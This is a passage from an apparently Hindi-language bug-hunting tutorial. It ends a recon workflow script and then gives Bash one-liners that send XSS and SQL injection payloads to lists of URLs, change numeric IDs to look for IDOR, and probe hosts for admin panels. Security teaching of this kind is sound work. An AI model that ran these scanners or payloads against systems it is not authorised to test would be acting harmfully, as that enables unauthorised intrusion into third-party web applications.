XSS targets: $(cat exploitation/xss_targets.txt | wc -l)
SQLi targets: $(cat exploitation/sqli_targets.txt | wc -l)
IDOR targets: $(cat exploitation/idor_targets.txt | wc -l)

=== NEXT STEPS ===
1. Manual testing of identified targets
2. Deep dive into interesting subdomains
3. Business logic testing
4. API security testing

EOF

echo "✅ Bug hunting workflow completed!"
echo "📁 Results saved in: bug_hunt_$target/"
echo "📊 Summary report: bug_hunt_$target/reports/summary.txt"
echo "⏰ Completed at: $(date)"

# Open summary report
cat reports/summary.txt
```

### Quick Testing Commands for Different Scenarios

```bash
# Quick XSS testing on a list of URLs
cat urls.txt | while read url; do
    echo "[+] Testing $url"
    payloads=("<script>alert('XSS')</script>" "<img src=x onerror=alert('XSS')>")
    for payload in "${payloads[@]}"; do
        response=$(curl -s "$url?test=$payload")
        if [[ $response == *"$payload"* ]]; then
            echo "[!] Potential XSS: $url"
            echo "    Payload: $payload"
        fi
    done
done

# Quick SQL injection testing
cat urls_with_params.txt | while read url; do
    echo "[+] Testing SQL injection: $url"
    sqli_payloads=("'" "\"" "' OR '1'='1" "\" OR \"1\"=\"1")
    for payload in "${sqli_payloads[@]}"; do
        response=$(curl -s "${url}${payload}")
        if [[ $response == *"error"* ]] || [[ $response == *"mysql"* ]] || [[ $response == *"syntax"* ]]; then
            echo "[!] Potential SQLi: $url"
            echo "    Payload: $payload"
        fi
    done
done

# Quick IDOR testing
cat idor_urls.txt | while read url; do
    echo "[+] Testing IDOR: $url"
    # Extract number from URL
    original_id=$(echo $url | grep -o '[0-9]\+' | head -1)
    if [ ! -z "$original_id" ]; then
        # Test with different IDs
        for new_id in $((original_id-1)) $((original_id+1)) $((original_id*2)); do
            test_url=$(echo $url | sed "s/$original_id/$new_id/")
            response=$(curl -s -o /dev/null -w "%{http_code}" "$test_url")
            if [ "$response" = "200" ]; then
                echo "[!] Potential IDOR: $test_url"
            fi
        done
    fi
done

# Quick admin panel discovery
cat live_hosts.txt | while read host; do
    echo "[+] Checking admin panels for $host"
    admin_paths=("admin" "administrator" "admin.php" "login" "wp-admin" "admin/login")
    for path in "${admin_paths[@]}"; do
        response=$(curl -s -o /dev/null -w "%{http_code}" "$host/$path")
        if [ "$response" = "200" ] || [ "$response" = "302" ]; then
            echo "[!] Admin panel found: $host/$path (Status: $response)"
        fi
    done
done
```

Yeh comprehensive command usage examples Hindi speakers ke liye specially designed hain. Har command ke saath detailed explanation di gayi hai ki kya karta hai aur kaise use karna hai. Practical examples bhi diye gaye hain jo real bug hunting scenarios mein use ho sakte hain.